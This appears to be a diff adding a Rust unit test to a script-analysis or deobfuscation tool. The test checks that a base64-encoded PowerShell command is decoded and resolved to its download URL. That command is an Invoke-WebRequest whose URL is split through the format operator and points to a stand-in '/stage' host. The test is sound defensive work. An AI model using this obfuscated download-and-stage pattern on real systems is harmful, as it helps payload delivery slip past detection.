@@ -9160,6 +9160,31 @@ if ($finalScript -ne $null) {{
             report.traits
         );
     }
+
+    #[test]
+    fn ps1_format_double_quoted_resolves_url() {
+        use base64::Engine;
+        let inner =
+            r#"Invoke-WebRequest -Uri ("{0}{1}{2}" -f "ht","tps://ps-format-dq.example","/stage")"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-format-dq.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "double-quoted PS format URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
